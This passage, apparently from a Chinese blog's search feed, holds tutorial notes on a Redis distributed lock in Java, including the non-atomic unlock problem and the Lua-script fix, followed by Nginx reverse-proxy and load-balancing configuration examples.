class="title function_">tryLock</span><span class="params">(<span class="type">long</span> timeoutSec)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取线程标识</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">threadId</span> <span class="operator">=</span> ID_PREFIX + Thread.currentThread().getId();</span><br><span class="line">        <span class="comment">// 获取锁</span></span><br><span class="line">        <span class="type">boolean</span> <span class="variable">success</span> <span class="operator">=</span> stringRedisTemplate.opsForValue()</span><br><span class="line">                .setIfAbsent(KEY_PREFIX + name, threadId, timeoutSec, TimeUnit.SECONDS);</span><br><span class="line">        <span class="keyword">return</span> Boolean.TRUE.equals(success); <span class="comment">// 避免自动拆箱出现空指针异常</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unLock</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">// 获取线程标识</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">threadId</span> <span class="operator">=</span> ID_PREFIX + Thread.currentThread().getId();</span><br><span class="line">        <span class="comment">// 获取锁中的线程标识</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">id</span> <span class="operator">=</span> stringRedisTemplate.opsForValue().get(KEY_PREFIX + name);</span><br><span class="line">        <span class="comment">// 判断是否一致</span></span><br><span class="line">        <span class="keyword">if</span> (threadId.equals(id)) &#123;</span><br><span class="line">            <span class="comment">// 释放锁</span></span><br><span class="line">            stringRedisTemplate.delete(KEY_PREFIX + name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这样可以避免因为业务堵塞导致锁过期而引发的误删锁问题</p>
<h2 id="新的问题-1"><a href="#新的问题-1" class="headerlink" title="新的问题"></a>新的问题</h2><p>如果一个线程获取锁后，已经进行完释放锁前的判断标识操作，此时如果因为gc阻塞了，导致锁过期了，那么其他线程就会获取到锁，导致释放了其他线程的锁，引发数据不一致，这就是<strong>标识判断与释放锁不是原子操作</strong>的问题。</p>
<p>注意，因为已经进行了判断标识操作，所以之后会直接释放其他线程的锁</p>
<p><img src="/images/image30.png" alt="alt text"></p>
<p>解决方案：</p>
<p>使用Lua脚本来实现原子操作</p>
<h3 id="Redis-Lua脚本"><a href="#Redis-Lua脚本" class="headerlink" title="Redis Lua脚本"></a>Redis Lua脚本</h3><p>Redis 提供了 Lua 脚本的支持，在一个脚本中编写多条 Redis 命令，确保多条命令执行时的原子性。</p>
]]></content>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title>nginx</title>
    <url>/2025/04/05/nginx/</url>
    <content><![CDATA[<h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><p>Nginx 是一个高性能的 HTTP 和反向代理服务器，同时也是一个 IMAP&#x2F;POP3&#x2F;SMTP 代理服务器。</p>
<p>Nginx 的主要特点包括：</p>
<ul>
<li>高性能：Nginx 可以处理大量的并发连接，适合高负载的场景。</li>
<li>反向代理：Nginx 可以作为反向代理服务器，将请求转发到后端服务器。</li>
<li>负载均衡：Nginx 可以将请求分发到多个后端服务器，实现负载均衡。</li>
<li>静态文件服务：Nginx 可以高效地提供静态文件服务，支持 gzip 压缩和缓存。<br>…</li>
</ul>
<h2 id="Nginx-反向代理"><a href="#Nginx-反向代理" class="headerlink" title="Nginx 反向代理"></a>Nginx 反向代理</h2><p>Nginx 反向代理的基本配置如下：</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost; // 监听80端口，server_name为<span class="attribute">localhost</span></span><br><span class="line"></span><br><span class="line">    location /api/ &#123; // 前端localhost:80/api/ 转发到 后端localhost:8080/admin/</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://localhost:8080/admin/; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Nginx 反向代理的工作原理是，当客户端请求 Nginx 时，Nginx 会将请求转发到后端服务器（如 Apache Tomcat），然后将后端服务器的响应返回给客户端。</p>
<div style="display: flex; align-items: center; gap: 10px;">
  <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/googlechrome?viewbox=auto" />
  <span>→</span>
  <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/nginx?viewbox=auto" />
  <span>→</span>
  <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/apachetomcat?viewbox=auto" />
</div>

<h2 id="反向代理的好处"><a href="#反向代理的好处" class="headerlink" title="反向代理的好处"></a>反向代理的好处</h2><ul>
<li>提高访问速度：Nginx 可以缓存静态文件，提高访问速度。</li>
<li>可以实现负载均衡，将请求分发到多个后端服务器，提高性能。</li>
<li>可以隐藏后端服务器的真实地址，提高安全性。</li>
</ul>
<div style="display: flex; align-items: center; gap: 10px;">
  <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/googlechrome?viewbox=auto" />
  <span>→</span>
  <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/nginx?viewbox=auto" />
  <span>→</span>
  <div style="display: flex; flex-direction: column; gap: 5px;">
    <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/cloudflare?viewbox=auto" />
    <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/cloudflare?viewbox=auto" />
    <img style="height: 50px; width: auto;" src="https://cdn.simpleicons.org/cloudflare?viewbox=auto" />
  </div>
</div>

<p>负载均衡：把大量的请求按照指定方式均衡的分发到多个后端服务器上，避免单台服务器过载。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="section">upstream</span> webservers &#123;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.128:8080</span>;</span><br><span class="line">    <span class="attribute">server</span> <span class="number">192.168.100.129:8080</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span> <span class="number">80</span>;</span><br><span class="line">    <span class="attribute">server_name</span> localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://webservers/admin; <span class="comment"># 负载均衡</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>负载均衡策略：</p>
<table>
<thead>
<tr>
<th>策略</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>轮询</td>
<td>默认策略，按顺序将请求分发到后端服务器</td>
</tr>
<tr>
<td>weight</td>
<td>按照权重分发请求，权重越高，分配的请求越多</td>
</tr>
<tr>
<td>ip_hash</td>
<td>根据客户端 IP 地址进行负载均衡，同一 IP 地址的请求会被分发到同一台后端服务器</td>
</tr>
<tr>
<td>least_conn</td>
<td>将请求分发到连接数最少的后端服务器</td>
</tr>
<tr>
<td>url_hash</td>
<td>根据请求 URL 进行负载均衡，同一 URL 的请求会被分发到同一台后端服务器</td>
</tr>
<tr>
<td>fair</td>
<td>根据请求的响应时间进行负载均衡，响应时间越短的服务器会被优先选择</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
</search>
